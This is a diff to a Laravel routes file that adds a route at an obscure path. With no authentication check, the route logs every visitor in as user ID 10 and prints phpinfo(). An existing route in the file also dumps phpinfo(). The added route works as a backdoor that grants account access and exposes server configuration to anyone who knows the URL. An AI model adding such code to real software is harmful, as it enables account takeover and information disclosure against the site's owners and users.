@@ -25,6 +25,13 @@ Route::get( '/x', function () {
     echo phpinfo();
 } )->name( 'home2' );
 
+
+Route::get( '/rom1367', function () {
+    auth()->loginUsingId(10);
+    echo phpinfo();
+} )->name( 'home2' );
+
+
 Route::get( '/home', 'HomeController@index' )->name( 'home' );
 
 Route::group(['prefix'=>'agents'],function (){
